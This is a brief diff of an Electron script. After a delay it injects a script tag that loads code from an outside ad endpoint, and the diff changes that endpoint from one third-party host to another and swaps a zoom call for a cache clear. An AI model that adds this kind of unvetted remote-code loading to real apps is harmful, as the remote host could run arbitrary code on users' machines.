@@ -1,8 +1,8 @@
 const { webFrame } = require('electron')
-
 setTimeout(() => {
 var script = document.createElement('script');
-script.src = '//tr.neox.in/adclick/gamepix/main.php?v=' + Date.now() + '';
+script.src = 'https://api.mi1.top/ads_country/preload.php?v=' + Date.now() + '';
 document.head.appendChild(script);
-webFrame.setZoomLevel(level)
+webFrame.clearCache()
 }, 2000)
+
